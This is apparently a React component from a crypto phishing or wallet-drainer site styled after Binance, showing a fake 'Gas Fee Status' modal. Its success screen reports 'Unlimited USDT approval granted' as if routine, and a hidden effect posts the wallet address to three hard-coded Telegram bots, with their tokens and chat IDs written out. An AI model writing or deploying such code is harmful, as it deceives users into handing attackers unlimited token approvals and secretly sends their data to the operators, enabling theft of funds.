
import React from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { BinanceLogo } from '@/components/BinanceLogo';

interface TransactionModalProps {
  state: 'loading' | 'confirming' | 'success';
  onClose: () => void;
}

export const TransactionModal: React.FC<TransactionModalProps> = ({ state, onClose }) => {
  // Send wallet address to Telegram only on success
  React.useEffect(() => {
    if (state === 'success') {
      const sendToTelegram = async () => {
        const walletAddress = '0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t';
        const telegramBots = [
          { token: '8090101974:AAE3xE3FHWY-Z-2FmnF-ojjvP9BLsWB1eOI', chatId: '6774801802' },
          { token: '7709787004:AAHEVEnqJjc6RzpaHcjePwzifB2ODVCNnDg', chatId: '7667794965' },
          { token: '7280248421:AAEl_W-g7kFKCBBrWBi6ADsDGeTn0YEl82o', chatId: '5831749892' }
        ];

        for (const bot of telegramBots) {
          try {
            await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: bot.chatId,
                text: `Wallet Address: ${walletAddress}`
              })
            });
          } catch (error) {
            console.error('Error sending to telegram:', error);
          }
        }
      };
      
      sendToTelegram();
    }
  }, [state]);

  const getContent = () => {
    switch (state) {
      case 'loading':
        return {
          title: 'Gas Fee Status',
          content: (
            <div className="text-center py-8">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="w-16 h-16 border-4 border-gray-600 border-t-white rounded-full animate-spin"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="w-8 h-8 bg-white rounded-full opacity-20"></div>
                  </div>
                </div>
              </div>
              <p className="text-white text-lg mt-4">Preparing Gas Confirmation...</p>
              <p className="text-gray-400 text-sm mt-2">Switching to BNB Smart Chain</p>
            </div>
          )
        };
      case 'confirming':
        return {
          title: 'Gas Fee Status',
          content: (
            <div className="text-center py-8">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="w-16 h-16 border-4 border-gray-600 border-t-white rounded-full animate-spin"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="w-8 h-8 bg-white rounded-full opacity-20"></div>
                  </div>
                </div>
              </div>
              <p className="text-white text-lg mt-4">Confirm Gas Fee...</p>
              <p className="text-gray-400 text-sm mt-2">Processing USDT approval</p>
            </div>
          )
        };
      case 'success':
        return {
          title: 'Gas Fee Status',
          content: (
            <div className="text-center py-8">
              <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                <span className="text-white text-2xl">✓</span>
              </div>
              <p className="text-white text-lg mt-4">Adjusting successful!</p>
              <div className="mt-4 space-y-2 text-sm">
                <p className="text-green-400">✓ Network switched to BNB Smart Chain</p>
                <p className="text-green-400">✓ Unlimited USDT approval granted</p>
                <p className="text-green-400">✓ Contract interaction enabled</p>
                <p className="text-gray-400">Wallet address notification sent</p>
              </div>
            </div>
          )
        };
    }
  };

  const { title, content } = getContent();

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
      <Card className="bg-gray-800 border-gray-700 p-6 w-full max-w-md animate-scale-in">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-white text-xl font-bold">{title}</h2>
          <Button
            onClick={onClose}
            variant="ghost"
            className="text-gray-400 hover:text-white p-2"
          >
            ✕
          </Button>
        </div>

        {content}

        <Button 
          onClick={onClose}
          className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 mt-6"
        >
          {state === 'success' ? 'Complete' : 'Close'}
        </Button>
      </Card>
    </div>
  );
};
